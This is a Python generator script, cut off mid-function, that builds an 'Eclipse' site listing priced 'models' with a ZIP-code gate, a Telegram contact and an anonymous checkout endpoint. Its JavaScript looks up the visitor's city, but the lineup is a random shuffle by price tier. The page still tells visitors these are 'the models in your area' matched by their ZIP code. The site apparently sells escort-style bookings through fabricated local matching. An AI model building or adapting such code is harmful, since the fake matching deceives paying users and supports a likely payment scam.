#!/usr/bin/env python3
from __future__ import annotations

import hashlib
import json
import re
import shutil
from pathlib import Path

BASE = Path(__file__).resolve().parent
IMAGES_DIR = BASE / "images"
MODELS_DIR = BASE / "models"
ASSETS_DIR = BASE / "assets"
HOME_PATH = BASE / "index.html"
GALLERY_DIR = BASE / "bsanvhbdahbhda"
TIPS_DIR = BASE / "tips"
EXTERNAL_MODELS_DIR = Path("/Users/mac/Downloads/model")

GALLERY_SLUG = "bsanvhbdahbhda"
CONTACT_URL = "http://t.me/leon_ytwolf"
CONTACT_LABEL = "Telegram: @leon_ytwolf"
CHECKOUT_ENDPOINT = "https://zuyxjzobvwnwvrjzxqqd.supabase.co/functions/v1/anonymous-checkout"
IMAGE_EXTS = {".jpeg", ".jpg", ".png", ".webp"}

DISPLAY_OVERRIDES = {
    "aaliyah": "Aaliyah",
    "annabelle": "Annabelle",
    "camila": "Camila",
    "deshawn": "Deshawn",
    "eleanor": "Eleanor",
    "emma": "Emma",
    "fray": "Fray",
    "gabrielle": "Gabrielle",
    "imani": "Imani",
    "isabella": "Isabella",
    "jasmine": "Jasmine",
    "kehlani": "Kehlani",
    "lily": "Lily",
    "luna": "Luna",
    "maskedayana": "Masked Ayana",
    "naomi": "Naomi",
    "nia": "Nia",
    "olivia": "Olivia",
    "serena": "Serena",
    "sophia": "Sophia",
    "valentina": "Valentina",
    "zara": "Zara",
}

PRICE_OVERRIDES = {
    "sophia": 700,
    "isabella": 500,
    "valentina": 900,
    "camila": 900,
    "aaliyah": 600,
    "jasmine": 900,
    "gabrielle": 1400,
    "luna": 500,
    "serena": 1200,
    "naomi": 800,
    "zara": 700,
    "kehlani": 700,
    "annabelle": 1100,
    "deshawn": 900,
    "eleanor": 1300,
    "emma": 1000,
    "fray": 1200,
    "imani": 900,
    "lily": 800,
    "maskedayana": 1500,
    "nia": 900,
    "olivia": 1000,
}

FAVICON_SVG = r'''
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 64 64">
  <defs>
    <linearGradient id="bg" x1="0" y1="0" x2="1" y2="1">
      <stop offset="0%" stop-color="#151515"/>
      <stop offset="100%" stop-color="#050505"/>
    </linearGradient>
    <linearGradient id="gold" x1="0" y1="0" x2="1" y2="1">
      <stop offset="0%" stop-color="#f1d58a"/>
      <stop offset="100%" stop-color="#c9a455"/>
    </linearGradient>
  </defs>
  <rect x="2" y="2" width="60" height="60" rx="16" fill="url(#bg)" stroke="#2f2a20" stroke-width="2"/>
  <circle cx="32" cy="32" r="19" fill="none" stroke="url(#gold)" stroke-width="3" opacity="0.9"/>
  <path d="M40 20c-2.8-2.2-6.2-3.3-10-3.3-8.8 0-15.3 6.4-15.3 15.3 0 9.2 6.7 15.3 15.9 15.3 3.7 0 6.9-0.9 9.8-3l-2.8-4.3c-2.1 1.5-4.3 2.2-6.6 2.2-5.8 0-9.9-4-9.9-10.2 0-6 4.1-10.2 9.7-10.2 2.5 0 4.8 0.7 6.9 2.3z" fill="url(#gold)"/>
</svg>
'''

STYLE_CSS = r'''
:root {
    --bg: #0c0c0c;
    --bg-elevated: #111111;
    --card-bg: #151515;
    --card-bg-soft: #181818;
    --border: #262626;
    --border-strong: #353535;
    --gold: #c9a455;
    --gold-light: #e8c978;
    --gold-soft: rgba(201, 164, 85, 0.12);
    --text: #ffffff;
    --muted: #8b8b8b;
    --danger: #e26a6a;
    --success: #8dd49b;
    --shadow: 0 24px 80px rgba(0, 0, 0, 0.55);
}

*,
*::before,
*::after {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
}

html {
    scroll-behavior: smooth;
}

body {
    min-height: 100vh;
    background: var(--bg);
    color: var(--text);
    font-family: 'Montserrat', 'Segoe UI', sans-serif;
    position: relative;
}

body::before {
    content: '';
    position: fixed;
    inset: 0;
    z-index: -2;
    background: radial-gradient(ellipse at 50% 18%, #1e130a 0%, #0c0c0c 62%);
}

body::after {
    content: '';
    position: fixed;
    inset: 0;
    z-index: -1;
    pointer-events: none;
    opacity: 0.45;
    background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noise'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noise)' opacity='0.04'/%3E%3C/svg%3E");
}

a {
    color: inherit;
}

button,
input,
textarea,
select {
    font: inherit;
}

button {
    border: 0;
    cursor: pointer;
}

img {
    max-width: 100%;
    display: block;
}

.page-shell {
    width: min(1240px, calc(100% - 2rem));
    margin: 0 auto;
}

.center-screen {
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 2rem 1rem;
}

.access-card,
.panel,
.checkout-panel {
    width: min(540px, 100%);
    background: rgba(15, 15, 15, 0.9);
    border: 1px solid rgba(255, 255, 255, 0.08);
    box-shadow: var(--shadow);
    border-radius: 28px;
    backdrop-filter: blur(16px);
    -webkit-backdrop-filter: blur(16px);
}

.access-card {
    padding: 2.5rem 2rem;
}

.brand,
.nav-brand,
.site-brand,
.hero-name,
.section-title,
.model-card-name,
.modal-title {
    font-family: 'Cormorant Garamond', Georgia, serif;
}

.brand,
.site-brand,
.nav-brand {
    text-transform: uppercase;
    font-weight: 300;
    letter-spacing: 0.45em;
    padding-right: 0.45em;
}

.brand {
    font-size: clamp(2.8rem, 10vw, 5rem);
    text-align: center;
}

.brand em,
.site-brand em,
.nav-brand em,
.hero-name em {
    font-style: normal;
    color: var(--gold);
}

.brand-divider,
.section-divider,
.header-divider {
    width: 88px;
    height: 1px;
    margin: 1.4rem auto 1.5rem;
    background: linear-gradient(to right, transparent, var(--gold), transparent);
}

.access-subtitle,
.kicker,
.meta-line,
.eyebrow,
.location-chip,
.footer,
.nav-link,
.price-pill,
.action-price,
.small-note,
.site-tagline {
    text-transform: uppercase;
    letter-spacing: 0.28em;
}

.access-subtitle,
.site-tagline,
.small-note,
.meta-line,
.footer,
.location-chip {
    color: var(--muted);
}

.access-subtitle,
.site-tagline {
    text-align: center;
    font-size: 0.72rem;
    line-height: 1.9;
}

.contact-link {
    color: var(--gold);
    text-decoration: none;
}

.contact-link:hover {
    color: var(--gold-light);
}

.step {
    display: none;
}

.step.active {
    display: block;
}

.form-stack {
    display: grid;
    gap: 1rem;
    margin-top: 1.5rem;
}

.field,
textarea.field {
    width: 100%;
    background: #171717;
    border: 1px solid var(--border);
    color: var(--text);
    border-radius: 16px;
    padding: 1rem 1.05rem;
    outline: none;
    transition: border-color 0.2s ease, box-shadow 0.2s ease, transform 0.2s ease;
}

textarea.field {
    min-height: 110px;
    resize: vertical;
}

.field:focus,
textarea.field:focus {
    border-color: var(--gold);
    box-shadow: 0 0 0 3px rgba(201, 164, 85, 0.12);
}

.field::placeholder,
textarea.field::placeholder {
    color: #575757;
}

.form-grid {
    display: grid;
    grid-template-columns: repeat(2, minmax(0, 1fr));
    gap: 1rem;
}

.btn,
.btn-secondary,
.action-button,
.auth-tab {
    border-radius: 999px;
    transition: transform 0.18s ease, background 0.18s ease, border-color 0.18s ease, color 0.18s ease;
}

.btn,
.action-button {
    background: var(--gold);
    color: #0c0c0c;
    font-weight: 700;
    padding: 1rem 1.2rem;
    letter-spacing: 0.2em;
    text-transform: uppercase;
}

.btn:hover,
.action-button:hover {
    background: var(--gold-light);
    transform: translateY(-1px);
}

.btn-secondary,
.auth-tab {
    background: transparent;
    border: 1px solid var(--border-strong);
    color: var(--text);
    padding: 0.95rem 1.2rem;
}

.btn-secondary:hover,
.auth-tab:hover {
    border-color: var(--gold);
    color: var(--gold-light);
}

.auth-tabs {
    display: grid;
    grid-template-columns: repeat(2, minmax(0, 1fr));
    gap: 0.75rem;
    margin-top: 1rem;
}

.auth-tab.active {
    background: var(--gold-soft);
    border-color: rgba(201, 164, 85, 0.55);
    color: var(--gold-light);
}

.message-box {
    margin-top: 1rem;
    padding: 0.95rem 1rem;
    border-radius: 16px;
    font-size: 0.92rem;
    line-height: 1.65;
    border: 1px solid rgba(255, 255, 255, 0.08);
    background: rgba(255, 255, 255, 0.03);
}

.message-box.error {
    color: #ffd5d5;
    border-color: rgba(226, 106, 106, 0.38);
    background: rgba(226, 106, 106, 0.12);
}

.message-box.success {
    color: #d9ffe0;
    border-color: rgba(141, 212, 155, 0.32);
    background: rgba(141, 212, 155, 0.12);
}

.message-box.info {
    color: #f6f0de;
    border-color: rgba(201, 164, 85, 0.28);
    background: rgba(201, 164, 85, 0.1);
}

.loading-text {
    opacity: 0.75;
}

.site-header {
    text-align: center;
    padding: 4.5rem 1rem 2rem;
}

.site-brand {
    font-size: clamp(2rem, 6vw, 3.6rem);
}

.header-actions {
    margin-top: 1.4rem;
    display: flex;
    justify-content: center;
    flex-wrap: wrap;
    gap: 0.8rem;
}

.location-chip {
    display: inline-flex;
    align-items: center;
    justify-content: center;
    gap: 0.5rem;
    padding: 0.85rem 1.1rem;
    border-radius: 999px;
    background: rgba(255, 255, 255, 0.04);
    border: 1px solid rgba(255, 255, 255, 0.08);
    font-size: 0.66rem;
}

.heading-block {
    text-align: center;
    margin-bottom: 2.25rem;
}

.heading-block h1,
.heading-block h2 {
    font-family: 'Cormorant Garamond', Georgia, serif;
    font-size: clamp(2.4rem, 7vw, 4.4rem);
    font-weight: 300;
    letter-spacing: 0.08em;
    line-height: 1;
}

.heading-block p {
    max-width: 760px;
    margin: 1rem auto 0;
    color: var(--muted);
    line-height: 1.8;
}

.models-section {
    padding: 1rem 0 5rem;
}

.models-grid {
    display: grid;
    grid-template-columns: repeat(auto-fill, minmax(240px, 1fr));
    gap: 1.35rem;
}

.model-card {
    position: relative;
    display: block;
    aspect-ratio: 3 / 4;
    overflow: hidden;
    border-radius: 24px;
    background: var(--card-bg);
    border: 1px solid rgba(255, 255, 255, 0.08);
    text-decoration: none;
    transition: transform 0.32s ease, border-color 0.32s ease, box-shadow 0.32s ease;
}

.model-card:hover {
    transform: translateY(-7px);
    border-color: rgba(201, 164, 85, 0.52);
    box-shadow: 0 24px 80px rgba(0, 0, 0, 0.65);
}

.model-card-photo {
    width: 100%;
    height: 100%;
    object-fit: cover;
    object-position: top center;
    transition: transform 0.45s ease;
}

.model-card:hover .model-card-photo {
    transform: scale(1.04);
}

.model-card-overlay {
    position: absolute;
    inset: auto 0 0 0;
    padding: 2.2rem 1.2rem 1.2rem;
    background: linear-gradient(to top, rgba(0, 0, 0, 0.94) 0%, rgba(0, 0, 0, 0.56) 58%, transparent 100%);
}

.model-card-name {
    font-size: 1.8rem;
    font-weight: 400;
    letter-spacing: 0.06em;
}

.model-card-meta {
    margin-top: 0.35rem;
    display: flex;
    align-items: center;
    justify-content: space-between;
    gap: 0.75rem;
}

.model-card-price {
    color: var(--gold);
    font-size: 0.8rem;
    letter-spacing: 0.18em;
    text-transform: uppercase;
}

.model-card-tag {
    color: var(--muted);
    font-size: 0.68rem;
    letter-spacing: 0.18em;
    text-transform: uppercase;
}

.randomizer-row {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 0.8rem;
    flex-wrap: wrap;
    margin-bottom: 1.5rem;
}

.site-nav {
    position: sticky;
    top: 0;
    z-index: 40;
    display: flex;
    align-items: center;
    justify-content: space-between;
    gap: 1rem;
    padding: 1rem;
    border-bottom: 1px solid rgba(255, 255, 255, 0.06);
    background: rgba(12, 12, 12, 0.82);
    backdrop-filter: blur(14px);
    -webkit-backdrop-filter: blur(14px);
}

.nav-link {
    color: var(--muted);
    text-decoration: none;
    font-size: 0.7rem;
}

.nav-link:hover {
    color: var(--gold-light);
}

.nav-brand {
    font-size: 1.35rem;
}

.nav-spacer {
    width: 140px;
}

.hero {
    padding: 1.2rem 0 0;
}

.hero-grid {
    display: grid;
    grid-template-columns: minmax(0, 1.1fr) minmax(360px, 0.9fr);
    gap: 1.5rem;
    align-items: stretch;
}

.hero-media,
.hero-summary,
.gallery-panel,
.action-card {
    background: rgba(18, 18, 18, 0.92);
    border: 1px solid rgba(255, 255, 255, 0.08);
    border-radius: 28px;
    overflow: hidden;
    box-shadow: var(--shadow);
}

.hero-media {
    min-height: 560px;
}

.hero-media img {
    width: 100%;
    height: 100%;
    min-height: 560px;
    object-fit: cover;
    object-position: top center;
}

.hero-summary {
    padding: 2rem;
    display: flex;
    flex-direction: column;
    justify-content: space-between;
    gap: 1.5rem;
}

.kicker {
    color: var(--gold);
    font-size: 0.72rem;
}

.hero-name {
    font-size: clamp(3rem, 7vw, 5.2rem);
    font-weight: 300;
    letter-spacing: 0.08em;
    line-height: 0.95;
}

.hero-copy {
    color: #d8d8d8;
    line-height: 1.9;
    max-width: 38rem;
}

.price-pill {
    display: inline-flex;
    align-items: center;
    gap: 0.55rem;
    align-self: flex-start;
    padding: 0.95rem 1.15rem;
    border-radius: 999px;
    color: var(--gold-light);
    background: rgba(201, 164, 85, 0.12);
    border: 1px solid rgba(201, 164, 85, 0.24);
    font-size: 0.72rem;
}

.hero-quick-booking {
    padding: 1rem;
    border-radius: 22px;
    background: rgba(255, 255, 255, 0.03);
    border: 1px solid rgba(255, 255, 255, 0.06);
}

.hero-quick-booking-title {
    font-size: 0.72rem;
    letter-spacing: 0.24em;
    text-transform: uppercase;
    color: var(--gold-light);
    margin-bottom: 0.85rem;
}

.hero-quick-booking-copy {
    color: var(--muted);
    font-size: 0.9rem;
    line-height: 1.65;
    margin-bottom: 0.95rem;
}

.hero-quick-actions {
    display: grid;
    grid-template-columns: 1fr;
    gap: 0.7rem;
}

.quick-action-button {
    width: 100%;
    text-align: left;
    background: rgba(255, 255, 255, 0.03);
    border: 1px solid rgba(255, 255, 255, 0.08);
    color: var(--text);
    padding: 0.95rem 1rem;
    border-radius: 18px;
    transition: border-color 0.18s ease, transform 0.18s ease, background 0.18s ease;
}

.quick-action-button:hover {
    border-color: rgba(201, 164, 85, 0.5);
    background: rgba(201, 164, 85, 0.08);
    transform: translateY(-1px);
}

.quick-action-top {
    display: flex;
    align-items: center;
    justify-content: space-between;
    gap: 1rem;
}

.quick-action-name {
    font-size: 0.95rem;
    font-weight: 600;
}

.quick-action-price {
    color: var(--gold-light);
    font-size: 0.76rem;
    letter-spacing: 0.18em;
    text-transform: uppercase;
    white-space: nowrap;
}

.quick-action-caption {
    margin-top: 0.35rem;
    color: var(--muted);
    font-size: 0.82rem;
    line-height: 1.55;
}

.meta-grid {
    display: grid;
    grid-template-columns: repeat(3, minmax(0, 1fr));
    gap: 0.85rem;
}

.meta-card {
    padding: 1rem;
    border-radius: 20px;
    background: rgba(255, 255, 255, 0.03);
    border: 1px solid rgba(255, 255, 255, 0.06);
}

.meta-label {
    color: var(--muted);
    font-size: 0.7rem;
    letter-spacing: 0.2em;
    text-transform: uppercase;
}

.meta-value {
    margin-top: 0.55rem;
    font-size: 1rem;
    line-height: 1.5;
}

.actions-section,
.gallery-section {
    padding: 2rem 0 5rem;
}

.section-title {
    text-align: center;
    font-size: clamp(2rem, 5vw, 3.2rem);
    font-weight: 300;
    letter-spacing: 0.1em;
}

.section-title-small {
    font-size: clamp(1.45rem, 3vw, 2.1rem);
}

.section-subtitle {
    text-align: center;
    color: var(--muted);
    max-width: 760px;
    margin: 0.9rem auto 0;
    line-height: 1.85;
}

.actions-grid {
    margin-top: 2rem;
    display: grid;
    grid-template-columns: repeat(3, minmax(0, 1fr));
    gap: 1rem;
}

.action-card {
    padding: 1.4rem;
    display: flex;
    flex-direction: column;
    gap: 1rem;
}

.action-title-row {
    display: flex;
    align-items: flex-start;
    justify-content: space-between;
    gap: 1rem;
}

.action-title {
    font-size: 1.25rem;
    font-weight: 600;
}

.action-price {
    color: var(--gold);
    font-size: 0.74rem;
    white-space: nowrap;
}

.action-copy {
    color: var(--muted);
    line-height: 1.75;
    font-size: 0.95rem;
}

.gallery-panel {
    padding: 1.2rem;
}

.photo-grid {
    display: grid;
    grid-template-columns: repeat(3, minmax(0, 1fr));
    gap: 0.9rem;
}

.photo-item {
    position: relative;
    aspect-ratio: 3 / 4;
    border-radius: 22px;
    overflow: hidden;
    border: 1px solid rgba(255, 255, 255, 0.06);
    background: var(--card-bg-soft);
    cursor: pointer;
}

.photo-item img {
    width: 100%;
    height: 100%;
    object-fit: cover;
    object-position: top center;
    transition: transform 0.38s ease;
}

.photo-item:hover img {
    transform: scale(1.04);
}

.photo-item::after {
    content: '+';
    position: absolute;
    inset: auto 1rem 1rem auto;
    width: 44px;
    height: 44px;
    border-radius: 50%;
    display: grid;
    place-items: center;
    color: var(--gold-light);
    font-size: 1.2rem;
    background: rgba(0, 0, 0, 0.55);
    border: 1px solid rgba(201, 164, 85, 0.42);
    opacity: 0;
    transform: scale(0.85);
    transition: opacity 0.22s ease, transform 0.22s ease;
}

.photo-item:hover::after {
    opacity: 1;
    transform: scale(1);
}

.modal,
.lightbox {
    position: fixed;
    inset: 0;
    display: none;
    align-items: center;
    justify-content: center;
    padding: 1rem;
    z-index: 110;
    background: rgba(0, 0, 0, 0.78);
    backdrop-filter: blur(8px);
    -webkit-backdrop-filter: blur(8px);
}

.modal.active,
.lightbox.active {
    display: flex;
}

.checkout-panel {
    position: relative;
    width: min(720px, 100%);
    max-height: min(90vh, 920px);
    overflow: auto;
    padding: 1.6rem;
}

.close-button,
.lightbox-close,
.lightbox-nav {
    display: grid;
    place-items: center;
    border-radius: 50%;
    background: rgba(255, 255, 255, 0.04);
    border: 1px solid rgba(255, 255, 255, 0.12);
    color: var(--text);
}

.close-button {
    position: absolute;
    top: 1rem;
    right: 1rem;
    width: 42px;
    height: 42px;
}

.modal-title {
    font-size: clamp(2rem, 5vw, 3rem);
    font-weight: 300;
    letter-spacing: 0.08em;
}

.checkout-summary {
    margin-top: 1rem;
    display: grid;
    grid-template-columns: repeat(3, minmax(0, 1fr));
    gap: 0.85rem;
}

.summary-card {
    padding: 1rem;
    border-radius: 20px;
    background: rgba(255, 255, 255, 0.03);
    border: 1px solid rgba(255, 255, 255, 0.06);
}

.summary-label {
    color: var(--muted);
    font-size: 0.68rem;
    letter-spacing: 0.2em;
    text-transform: uppercase;
}

.summary-value {
    margin-top: 0.45rem;
    line-height: 1.5;
}

.hidden {
    display: none !important;
}

.step-panel {
    margin-top: 1.4rem;
}

.step-panel[hidden] {
    display: none !important;
}

.step-heading {
    font-size: 0.82rem;
    color: var(--gold-light);
    text-transform: uppercase;
    letter-spacing: 0.22em;
    margin-bottom: 0.9rem;
}

.field-hint {
    margin-top: 0.65rem;
    color: var(--muted);
    font-size: 0.88rem;
    line-height: 1.65;
}

.checkout-actions {
    margin-top: 1rem;
    display: flex;
    flex-wrap: wrap;
    gap: 0.85rem;
}

.reveal-card {
    margin-top: 1rem;
    padding: 1rem 1.1rem;
    border-radius: 18px;
    border: 1px solid rgba(141, 212, 155, 0.28);
    background: rgba(141, 212, 155, 0.08);
}

.reveal-card h4 {
    font-size: 0.78rem;
    text-transform: uppercase;
    letter-spacing: 0.2em;
    color: var(--success);
}

.reveal-card a {
    display: inline-block;
    margin-top: 0.55rem;
    color: var(--text);
    text-decoration: none;
    font-size: 1rem;
}

.lightbox {
    z-index: 120;
}

.lightbox-content {
    position: relative;
    width: min(92vw, 1100px);
    height: min(88vh, 860px);
    display: grid;
    place-items: center;
}

.lightbox-image {
    max-width: 100%;
    max-height: 100%;
    object-fit: contain;
    border-radius: 22px;
    box-shadow: 0 24px 80px rgba(0, 0, 0, 0.72);
}

.lightbox-close {
    position: fixed;
    top: 1.2rem;
    right: 1.2rem;
    width: 42px;
    height: 42px;
    z-index: 2;
}

.lightbox-nav {
    position: fixed;
    top: 50%;
    transform: translateY(-50%);
    width: 54px;
    height: 54px;
    font-size: 1.6rem;
    z-index: 2;
}

.lightbox-nav.prev {
    left: 1rem;
}

.lightbox-nav.next {
    right: 1rem;
}

.lightbox-counter {
    position: fixed;
    bottom: 1rem;
    left: 50%;
    transform: translateX(-50%);
    color: var(--muted);
    font-size: 0.75rem;
    letter-spacing: 0.26em;
    text-transform: uppercase;
}

.footer {
    text-align: center;
    padding: 2rem 1rem 2.5rem;
    font-size: 0.62rem;
    line-height: 2;
}

@media (max-width: 1024px) {
    .hero-grid,
    .actions-grid {
        grid-template-columns: 1fr;
    }

    .hero-media,
    .hero-media img {
        min-height: 420px;
    }
}

@media (max-width: 760px) {
    .form-grid,
    .photo-grid,
    .meta-grid,
    .checkout-summary {
        grid-template-columns: 1fr;
    }

    .photo-grid {
        grid-template-columns: repeat(2, minmax(0, 1fr));
    }

    .site-nav {
        grid-template-columns: 1fr;
        justify-items: center;
        text-align: center;
    }

    .nav-spacer {
        display: none;
    }

    .hero-summary,
    .checkout-panel,
    .access-card {
        padding: 1.35rem;
    }
}


.tips-page-card {
    position: static;
    max-height: none;
}

.amount-grid {
    display: grid;
    grid-template-columns: repeat(4, minmax(0, 1fr));
    gap: 0.8rem;
}

.amount-option {
    background: rgba(255,255,255,0.03);
    border: 1px solid rgba(255,255,255,0.08);
    color: var(--text);
    border-radius: 18px;
    padding: 0.95rem 1rem;
    font-weight: 600;
    transition: border-color 0.18s ease, background 0.18s ease, transform 0.18s ease;
}

.amount-option:hover,
.amount-option.active {
    border-color: rgba(201,164,85,0.5);
    background: rgba(201,164,85,0.08);
    transform: translateY(-1px);
}

.tips-note {
    color: var(--muted);
    font-size: 0.9rem;
    line-height: 1.7;
}

@media (max-width: 520px) {
    .page-shell {
        width: min(100% - 1rem, 1240px);
    }

    .photo-grid,
    .models-grid,
    .amount-grid {
        grid-template-columns: 1fr;
    }

    .lightbox-nav.prev {
        left: 0.55rem;
    }

    .lightbox-nav.next {
        right: 0.55rem;
    }
}
'''

SITE_JS = r'''
const SITE = window.ECLIPSE_SITE_DATA;
const LOCATION_KEY = 'eclipse_location';
const SELECTION_KEY = 'eclipse_selection';

let lightboxState = { photos: [], index: 0 };

function $(selector, root = document) {
    return root.querySelector(selector);
}

function $all(selector, root = document) {
    return Array.from(root.querySelectorAll(selector));
}

function formatCurrency(value) {
    return new Intl.NumberFormat('en-US', {
        style: 'currency',
        currency: 'USD',
        maximumFractionDigits: 0,
    }).format(value);
}

function escapeHtml(value = '') {
    return String(value)
        .replaceAll('&', '&amp;')
        .replaceAll('<', '&lt;')
        .replaceAll('>', '&gt;')
        .replaceAll('"', '&quot;')
        .replaceAll("'", '&#39;');
}

function getLocation() {
    try {
        return JSON.parse(sessionStorage.getItem(LOCATION_KEY) || 'null');
    } catch {
        return null;
    }
}

function setLocation(data) {
    sessionStorage.setItem(LOCATION_KEY, JSON.stringify(data));
}

function getSelection() {
    try {
        return JSON.parse(sessionStorage.getItem(SELECTION_KEY) || '[]');
    } catch {
        return [];
    }
}

function setSelection(slugs) {
    sessionStorage.setItem(SELECTION_KEY, JSON.stringify(slugs));
}

function clearSelection() {
    sessionStorage.removeItem(SELECTION_KEY);
}

function getHomePath() {
    return document.body.dataset.homePath || '.';
}

function goHome() {
    window.location.replace(`${getHomePath()}/`);
}

function requireLocation() {
    const location = getLocation();
    if (!location) {
        goHome();
        return null;
    }
    return location;
}

function titleCaseSlug(slug) {
    return slug
        .replace(/-/g, ' ')
        .replace(/\b\w/g, (match) => match.toUpperCase());
}

function getModel(slug) {
    return SITE.models.find((model) => model.slug === slug) || null;
}

function shuffle(items) {
    const copy = [...items];
    for (let index = copy.length - 1; index > 0; index -= 1) {
        const swapIndex = Math.floor(Math.random() * (index + 1));
        [copy[index], copy[swapIndex]] = [copy[swapIndex], copy[index]];
    }
    return copy;
}

function randomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function buildRandomSelection() {
    const min = Math.min(8, SITE.models.length);
    const max = Math.min(14, SITE.models.length);
    const count = SITE.models.length <= min ? SITE.models.length : randomInt(min, max);

    if (SITE.models.length <= 3) {
        const simpleSelection = shuffle(SITE.models).slice(0, count).map((model) => model.slug);
        setSelection(simpleSelection);
        return simpleSelection;
    }

    const sorted = [...SITE.models].sort((a, b) => a.price - b.price);
    const third = Math.max(1, Math.floor(sorted.length / 3));
    const lowPool = sorted.slice(0, third);
    const midPool = sorted.slice(third, Math.max(third * 2, third + 1));
    const highPool = sorted.slice(Math.max(third * 2, third + 1));

    const selected = [];
    const used = new Set();

    [lowPool, midPool, highPool].forEach((pool) => {
        const available = shuffle(pool).find((model) => !used.has(model.slug));
        if (available && selected.length < count) {
            selected.push(available);
            used.add(available.slug);
        }
    });

    const remaining = shuffle(sorted.filter((model) => !used.has(model.slug)));
    for (const model of remaining) {
        if (selected.length >= count) break;
        selected.push(model);
        used.add(model.slug);
    }

    const selection = shuffle(selected).map((model) => model.slug);
    setSelection(selection);
    return selection;
}

async function lookupZip(zipcode) {
    const response = await fetch(`https://api.zippopotam.us/us/${zipcode}`);
    if (!response.ok) {
        throw new Error('We could not find that ZIP code.');
    }

    const data = await response.json();
    const place = data.places && data.places[0];

    if (!place) {
        throw new Error('We could not determine your location from that ZIP code.');
    }

    return {
        zip: zipcode,
        city: place['place name'],
        state: place['state abbreviation'],
        stateName: place.state,
        country: data.country,
        latitude: place.latitude,
        longitude: place.longitude,
        label: `${place['place name']}, ${place['state abbreviation']}`,
        preciseLabel: `${place['place name']}, ${place.state}`,
    };
}

function setMessage(target, text, type = 'info') {
    if (!target) return;
    target.textContent = text || '';
    target.className = `message-box ${type}`;
    target.classList.toggle('hidden', !text);
}

function renderFooter() {
    const tipsHref = `${getHomePath()}/tips/`;
    return `&copy; 2026 Eclipse &mdash; Private Access Only<br><a class="contact-link" href="${SITE.settings.contactUrl}" target="_blank" rel="noopener noreferrer">${escapeHtml(SITE.settings.contactLabel)}</a><br><a class="contact-link" href="${tipsHref}">Send a Tip</a>`;
}

function initHomePage() {
    const zipForm = $('#zip-form');
    const zipInput = $('#zip-input');
    const zipMessage = $('#zip-message');
    const footer = $('#page-footer');

    if (footer) {
        footer.innerHTML = renderFooter();
    }

    const currentLocation = getLocation();
    if (currentLocation) {
        window.location.replace(`./${SITE.settings.gallerySlug}/`);
        return;
    }

    zipInput.focus();

    zipForm.addEventListener('submit', async (event) => {
        event.preventDefault();
        const zip = zipInput.value.trim();
        if (!/^\d{5}$/.test(zip)) {
            setMessage(zipMessage, 'Please enter a valid 5-digit ZIP code.', 'error');
            return;
        }

        const submitButton = $('button[type="submit"]', zipForm);
        submitButton.disabled = true;
        submitButton.textContent = 'Locating...';
        setMessage(zipMessage, 'Finding your local lineup…', 'info');

        try {
            const location = await lookupZip(zip);
            setLocation(location);
            clearSelection();
            buildRandomSelection();
            window.location.replace(`./${SITE.settings.gallerySlug}/`);
        } catch (error) {
            setMessage(zipMessage, error.message || 'Unable to look up that ZIP code.', 'error');
        } finally {
            submitButton.disabled = false;
            submitButton.textContent = 'See Models Near Me';
        }
    });
}

function modelCardMarkup(model, location) {
    return `
        <a class="model-card" href="../models/${model.slug}/">
            <img class="model-card-photo" src="../images/${model.slug}/${model.cover}" alt="${escapeHtml(model.name)}" loading="lazy">
            <div class="model-card-overlay">
                <div class="model-card-name">${escapeHtml(model.name)}</div>
                <div class="model-card-meta">
                    <div class="model-card-price">From ${formatCurrency(model.price)}</div>
                    <div class="model-card-tag">${escapeHtml(location.state)}</div>
                </div>
            </div>
        </a>
    `;
}

function initGalleryPage() {
    const location = requireLocation();
    if (!location) return;

    const footer = $('#page-footer');
    const locationLabel = $('#gallery-location');
    const title = $('#gallery-title');
    const copy = $('#gallery-copy');
    const grid = $('#gallery-grid');
    const shuffleButton = $('#shuffle-models');
    const updateZipButton = $('#change-zip');

    if (footer) {
        footer.innerHTML = renderFooter();
    }

    locationLabel.textContent = `Available near ${location.label}`;
    title.textContent = `Here are the models in your area — ${location.label}`;
    copy.textContent = `We matched this lineup using ZIP code ${location.zip}.`;

    function renderSelection() {
        const slugs = getSelection().length ? getSelection() : buildRandomSelection();
        const models = slugs.map(getModel).filter(Boolean);
        grid.innerHTML = models.map((model) => modelCardMarkup(model, location)).join('');
    }

    renderSelection();

    shuffleButton.addEventListener('click', () => {
        buildRandomSelection();
        renderSelection();
    });

    updateZipButton.addEventListener('click', () => {
        sessionStorage.removeItem(LOCATION_KEY);
        clearSelection();
        window.location.replace('../');
    });
}

function setupLightbox() {
    const lightbox = $('#lightbox');
    if (!lightbox) return;

    const image = $('#lightbox-image');
    const counter = $('#lightbox-counter');
    const closeButton = $('#lightbox-close');
    const prevButton = $('#lightbox-prev');
    const nextButton = $('#lightbox-next');

    function renderLightbox() {
        const currentPhoto = lightboxState.photos[lightboxState.index];
        if (!currentPhoto) return;
        image.src = currentPhoto.src;
        image.alt = currentPhoto.alt;
        counter.textContent = `${lightboxState.index + 1} — ${lightboxState.photos.length}`;
    }

    window.__openLightbox = function (photos, index) {
        lightboxState = { photos, index };
        renderLightbox();
        lightbox.classList.add('active');
        document.body.style.overflow = 'hidden';
    };

    function closeLightbox() {
        lightbox.classList.remove('active');
        document.body.style.overflow = '';
    }

    function moveLightbox(delta) {
        if (!lightboxState.photos.length) return;
        lightboxState.index = (lightboxState.index + delta + lightboxState.photos.length) % lightboxState.photos.length;
        renderLightbox();
    }

    closeButton.addEventListener('click', closeLightbox);
    prevButton.addEventListener('click', () => moveLightbox(-1));
    nextButton.addEventListener('click', () => moveLightbox(1));
    lightbox.addEventListener('click', (event) => {
        if (event.target === lightbox) closeLightbox();
    });

    document.addEventListener('keydown', (event) => {
        if (!lightbox.classList.contains('active')) return;
        if (event.key === 'Escape') closeLightbox();
        if (event.key === 'ArrowLeft') moveLightbox(-1);
        if (event.key === 'ArrowRight') moveLightbox(1);
    });
}

function fillCheckoutSummary(action, model, location) {
    const amount = action.pricing === 'model' ? model.price : action.amount;
    $('#checkout-model').textContent = model.name;
    $('#checkout-action').textContent = action.label;
    $('#checkout-total').textContent = formatCurrency(amount);
